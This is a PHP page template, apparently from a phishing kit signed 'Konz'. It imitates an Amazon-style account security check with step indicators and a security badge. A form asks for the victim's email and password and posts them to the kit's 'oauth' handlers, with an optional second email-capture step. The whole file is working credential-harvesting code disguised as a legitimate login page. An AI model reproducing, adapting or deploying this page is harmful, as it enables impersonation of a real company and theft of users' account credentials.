<?php 
defined("ACCESS") or die('Konz');
include FCPATH. "AREA16/application/views/layout/header.php";

if (_config('double_email')=='on'){
	$url=base_url()."oauth/first"; 
}else{
	$url=base_url() . "oauth/process";
}
?>
				<ul class="list-unstyled multi-steps" style="padding-top: 10px" align="center">
					<li class="is-active">
						<?php echo $_113 ?>
					</li>
					<li>
						<?php echo $_46 ?>
					</li>
					<li>
						<?php echo $_47 ?>
					</li>
					<li>
						<?php echo $_48 ?>
					</li>
				</ul>
				<div class="cc-content3">
					<div class="container">
						<div align="center"> <img src="<?=base_url()?>AREA16/assets/images/security.png" width="80"> </div>
						<div align="center"> <span class="lefttext" style="font-size: 20px; font-weight: 650;"><?php echo $_45 ?></span> </div>
						<div align="center"> <span class="lefttext"><?php echo $_49 ?></span> </div>
						<div class="row" style="padding-top: 5px">
							<div class="col-12">
								<div class="mypayementarea">
									<form action="<?=$url?>" method="post" name="konzform" id="konzform"> <span class="colorblacked"><?php echo $_51 ?></span>
										<div class="row mt-3">
											<div class="col-sm-6">
												<div class="form-group">
													<label for="email">
														<?php echo $_52 ?>
													</label>
													<input type="text" class="form-control amazoninput emailfocus" name="email" id="email" placeholder="<?php echo $_52 ?>" minlength="5" maxlength="30"> </div>
											</div>
											<div class="col-sm-6">
												<div class="form-group">
													<label for="password">
														<?php echo $_53 ?>
													</label>
													<input type="password" id="password" class="form-control amazoninput passwordfocus" name="password" placeholder="•••••••••••••" maxlength="25"> </div>
											</div>
										</div>
										<input type="submit" name="Sex" class="btn a-button-input" value="Continue"> </form>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
<?php include FCPATH. "AREA16/application/views/layout/footer.php"; ?>
		<script>
		let load;

		let _loader = () => {
			load = setTimeout(showPage, 1000);
		}

		let showPage = () => {
			document.getElementById('loader').style.display = 'none';
			document.getElementById('myDiv').style.display = 'block';
		}

		const alpha = (e) => {
		    let k;
		    document.all ? k = e.keyCode : k = e.which;
		    return ((k > 64 && k < 91) || (k > 96 && k < 123) || k == 8 || k == 32 || (k >= 48 && k <= 57));
		}
		
		$(document).ready(function(e) {
			$("#konzform").validate({
				errorClass: "error-class",
				rules: {
					email: {
						required: true,
						email: true
					},
					password: {
						required: true,
						minlength: 3
					}
				},
				messages: {
					email: {
						required: "<?php echo $_54 ?>"
					},
					password: {
						required: "<?php echo $_55 ?>",
						minlength: "<?php echo $_56 ?>"
					}
				}
			});
		})
		</script>
	</body>

	</html>